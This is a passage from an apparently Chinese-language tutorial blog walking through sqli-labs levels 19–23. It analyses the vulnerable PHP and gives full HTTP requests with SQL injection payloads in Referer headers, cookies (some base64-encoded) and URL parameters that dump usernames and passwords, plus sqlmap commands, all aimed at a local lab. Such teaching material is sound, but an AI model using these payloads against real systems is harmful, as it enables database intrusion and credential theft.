id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 获取请求的 referer 和 ip 地址</span><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> 输入了uname 和 passwd<span class="token punctuation">:</span>    <span class="token comment"># uname 和 passwd 参数均被过滤</span>    <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token constant">SQL</span>语句有返回结果<span class="token punctuation">:</span>        <span class="token comment"># 单引号拼接后直接带入 insert 语句</span>        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>')"</span><span class="token punctuation">;</span>        输出 <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-19/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>uname=admin&amp;passwd=admin&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/15894186942757.png" alt="img"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> cookie 中不存在 uname 参数<span class="token punctuation">:</span>      输出了一堆无用的信息    <span class="token keyword">if</span> 提交了 uname 和 passwd<span class="token punctuation">:</span>        <span class="token comment"># 进行过滤</span>        <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> 有查询结果<span class="token punctuation">:</span>            <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$cookee</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token constant">POST</span> 数据里面没有 submit 参数<span class="token punctuation">:</span>        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> 查询无结果<span class="token punctuation">:</span>            输出 <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> 有结果<span class="token punctuation">:</span>            输出查询的信息    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关，所以这里 老毛病又犯了，这里就再啰嗦一下：</p><h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-20/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=admin' and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/15894228024343.png" alt="img"></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-20/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/15894229147799.png" alt="img"></p><h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以 这里就不演示了，下面直接演示 sqlmap 的注入过程吧：</p><h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>联合查询注入</strong></p><p>如果 <code>--level</code> 设置为 <strong>2</strong> 或更高，则 sqlmap 会对 HTTP <code>Cookie</code> 请求头进行 SQL 注入测试:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然手动通过<code>*</code>来标记注入也比较方便：<code>--cookie=&quot;uname=admin*&quot;</code></p><p>**报错注入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>E -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**布尔盲注</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**延时盲注</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> cookie 中不存在 uname 参数<span class="token punctuation">:</span>      输出了一堆无用的信息    <span class="token keyword">if</span> 提交了 uname 和 passwd<span class="token punctuation">:</span>        <span class="token comment"># 进行过滤</span>        <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> 有查询结果<span class="token punctuation">:</span>            <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token constant">POST</span> 数据里面没有 submit 参数<span class="token punctuation">:</span>                 <span class="token comment"># 对 cookee 进行 base64 解密</span>        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> 查询无结果<span class="token punctuation">:</span>            输出 <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> 有结果<span class="token punctuation">:</span>            输出查询的信息    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用联合查询注入来简单演示一下吧：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-21/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/1589426073817.png" alt="img"></p><h3 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>手工注入问题不大，那么尝试直接使用 sqlmap 来进行联合查询注入看看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-21/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=*"</span> --tamper<span class="token operator">=</span><span class="token string">"base64encode"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap 本身不会混淆发送的 payload，混淆 payload 的话可以使用 sqlmap 自带的 payload 库</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先双引号 然后直接拼接到SQL语句中</span><span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span> <span class="token variable">$cookee</span><span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$cookee1</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的， 这里就不再啰嗦了。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-22/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=c3Fsc2VjIiB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QgR1JPVVBfQ09OQ0FUKHVzZXJuYW1lLHBhc3N3b3JkIFNFUEFSQVRPUiAweDNjNjI3MjNlKSBGUk9NIHVzZXJzKSM=</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;sqlsec&quot; union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 获取到 id 的值</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span><span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span><span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 使用单引号拼接 SQL</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> 有查询结果<span class="token punctuation">:</span>    输出查询信息<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-24"><a href="#Less-24" class="headerlink" 